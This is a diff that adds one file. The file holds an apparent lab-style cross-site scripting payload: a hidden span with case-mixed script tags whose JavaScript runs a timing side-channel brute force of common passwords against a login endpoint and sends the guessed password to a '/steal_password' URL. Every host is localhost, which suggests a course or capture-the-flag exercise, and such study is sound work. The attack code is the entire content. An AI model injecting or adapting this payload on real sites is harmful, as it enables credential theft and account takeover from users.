@@ -1,0 +1,44 @@
+<span style='display:none'>
+  <IMg id='test' />
+  <sCript>
+    var dictionary = [`password`, `123456`, `	12345678`, `dragon`, `1234`, `qwerty`, `12345`];
+    var times = [];
+    var index = 0;
+    var test = document.getElementById(`test`);
+    test.onerror = () => {
+      var end = new Date();
+
+      console.log(`Time elapsed ${end-start}`);
+      times.push(end-start);
+
+      start = new Date();
+      if (index < dictionary.length) {
+        test.src = `http://localhost:3000/get_login?username=userx&password=${dictionary[index]}`;
+      } else {
+        var sum = 0;
+        for (var i = 0; i < times.length; i++) {
+          sum += times[i];
+        }
+        var avg = sum / times.length;
+        var idx = -1;
+        var most_diff = 0;
+        for (var i = 0; i < times.length; i++) {
+          if (Math.abs(times[i] - avg) > most_diff) {
+            most_diff = Math.abs(times[i] - avg);
+            idx = i;
+          }
+        }
+        console.log(`Password: ${dictionary[idx]}`);
+        var url = `http://localhost:3000/steal_password?password=${dictionary[idx]}&timeElapsed=${times[idx]}`;
+        var xhr = new XMLHttpRequest();
+        xhr.open(`GET`, url, true);
+        xhr.send();
+      }
+      index += 1;
+    };
+    var start = new Date();
+    test.src = `http://localhost:3000/get_login?username=userx&password=${dictionary[index]}`;
+    index += 1;
+  </scRipt>  
+</span>
+
